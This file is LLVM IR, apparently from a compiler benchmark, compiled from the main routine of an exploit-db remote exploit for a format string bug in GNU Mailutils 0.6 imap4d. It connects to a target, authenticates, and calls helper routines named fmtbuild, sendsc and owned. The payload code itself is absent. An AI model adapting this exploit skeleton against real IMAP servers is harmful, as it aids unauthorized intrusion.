; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1209.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [61 x i8] c"[+] GNU Mailutils 0.6 imap4d 'search' format string exploit.\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"[+] By clem1.\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"h:p:u:s:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [20 x i8] c"[-] gethostbyname()\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"[+] connecting to: %s:%d\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [13 x i8] c"[-] socket()\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"[-] connect()\00", align 1
@b = common dso_local global i64* null, align 8
@i = common dso_local global i64 0, align 8
@.str.7 = private unnamed_addr constant [10 x i8] c"IMAP4rev1\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"[-] failled.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 @puts(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 @puts(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %4, align 4
  %17 = icmp ne i32 %16, 9
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @usage(i8* %21)
  br label %23

23:                                               ; preds = %18, %2
  br label %24

24:                                               ; preds = %49, %23
  %25 = load i32, i32* %4, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = call signext i8 @getopt(i32 %25, i8** %26, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  store i8 %27, i8* %6, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8, i8* @EOF, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %28, %30
  br i1 %31, label %32, label %50

32:                                               ; preds = %24
  %33 = load i8, i8* %6, align 1
  %34 = sext i8 %33 to i32
  switch i32 %34, label %44 [
    i32 104, label %35
    i32 112, label %37
    i32 117, label %40
    i32 115, label %42
  ]

35:                                               ; preds = %32
  %36 = load i8*, i8** @optarg, align 8
  store i8* %36, i8** %7, align 8
  br label %49

37:                                               ; preds = %32
  %38 = load i8*, i8** @optarg, align 8
  %39 = call i32 @atoi(i8* %38)
  store i32 %39, i32* %12, align 4
  br label %49

40:                                               ; preds = %32
  %41 = load i8*, i8** @optarg, align 8
  store i8* %41, i8** %8, align 8
  br label %49

42:                                               ; preds = %32
  %43 = load i8*, i8** @optarg, align 8
  store i8* %43, i8** %9, align 8
  br label %49

44:                                               ; preds = %32
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @usage(i8* %47)
  br label %49

49:                                               ; preds = %44, %42, %40, %37, %35
  br label %24

50:                                               ; preds = %24
  %51 = load i8*, i8** %7, align 8
  %52 = call %struct.hostent* @gethostbyname(i8* %51)
  store %struct.hostent* %52, %struct.hostent** %10, align 8
  %53 = icmp eq %struct.hostent* %52, null
  br i1 %53, label %54, label %57

54:                                               ; preds = %50
  %55 = call i32 @herror(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %56 = call i32 @exit(i32 1) #4
  unreachable

57:                                               ; preds = %50
  %58 = load %struct.hostent*, %struct.hostent** %10, align 8
  %59 = getelementptr inbounds %struct.hostent, %struct.hostent* %58, i32 0, i32 0
  %60 = load i64, i64* %59, align 8
  %61 = inttoptr i64 %60 to %struct.in_addr*
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 4
  %64 = call i8* @inet_ntoa(i32 %63)
  %65 = load i32, i32* %12, align 4
  %66 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0), i8* %64, i32 %65)
  %67 = load i32, i32* @AF_INET, align 4
  %68 = load i32, i32* @SOCK_STREAM, align 4
  %69 = call i32 @socket(i32 %67, i32 %68, i32 0)
  store i32 %69, i32* %13, align 4
  %70 = load i32, i32* %13, align 4
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %75

72:                                               ; preds = %57
  %73 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %74 = call i32 @exit(i32 1) #4
  unreachable

75:                                               ; preds = %57
  %76 = load i32, i32* @AF_INET, align 4
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 3
  store i32 %76, i32* %77, align 4
  %78 = load i32, i32* %12, align 4
  %79 = call i32 @htons(i32 %78)
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %79, i32* %80, align 4
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %82 = load %struct.hostent*, %struct.hostent** %10, align 8
  %83 = getelementptr inbounds %struct.hostent, %struct.hostent* %82, i32 0, i32 0
  %84 = load i64, i64* %83, align 8
  %85 = inttoptr i64 %84 to %struct.in_addr*
  %86 = bitcast %struct.in_addr* %81 to i8*
  %87 = bitcast %struct.in_addr* %85 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %86, i8* align 4 %87, i64 4, i1 false)
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %89 = call i32 @bzero(i32* %88, i32 8)
  %90 = load i32, i32* %13, align 4
  %91 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %92 = call i32 @connect(i32 %90, %struct.sockaddr* %91, i32 16)
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %97

94:                                               ; preds = %75
  %95 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0))
  %96 = call i32 @exit(i32 1) #4
  unreachable

97:                                               ; preds = %75
  %98 = load i32, i32* %13, align 4
  %99 = load i64*, i64** @b, align 8
  %100 = call i64 @recv(i32 %98, i64* %99, i32 1023, i32 0)
  store i64 %100, i64* @i, align 8
  %101 = load i64*, i64** @b, align 8
  %102 = load i64, i64* @i, align 8
  %103 = getelementptr inbounds i64, i64* %101, i64 %102
  store i64 0, i64* %103, align 8
  %104 = load i64*, i64** @b, align 8
  %105 = call i32* @strstr(i64* %104, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.7, i64 0, i64 0))
  %106 = icmp eq i32* %105, null
  br i1 %106, label %107, label %110

107:                                              ; preds = %97
  %108 = call i32 @puts(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  %109 = call i32 @exit(i32 1) #4
  unreachable

110:                                              ; preds = %97
  %111 = load i32, i32* %13, align 4
  %112 = load i8*, i8** %8, align 8
  %113 = load i8*, i8** %9, align 8
  %114 = call i32 @auth(i32 %111, i8* %112, i8* %113)
  %115 = load i32, i32* %13, align 4
  %116 = call i32 @fmtbuild(i32 %115)
  %117 = load i32, i32* %13, align 4
  %118 = call i32 @sendsc(i32 %117)
  %119 = load i32, i32* %13, align 4
  %120 = load i8*, i8** %7, align 8
  %121 = call i32 @owned(i32 %119, i8* %120)
  ret i32 0
}

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, i8*, i32) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @recv(i32, i64*, i32, i32) #1

declare dso_local i32* @strstr(i64*, i8*) #1

declare dso_local i32 @auth(i32, i8*, i8*) #1

declare dso_local i32 @fmtbuild(i32) #1

declare dso_local i32 @sendsc(i32) #1

declare dso_local i32 @owned(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
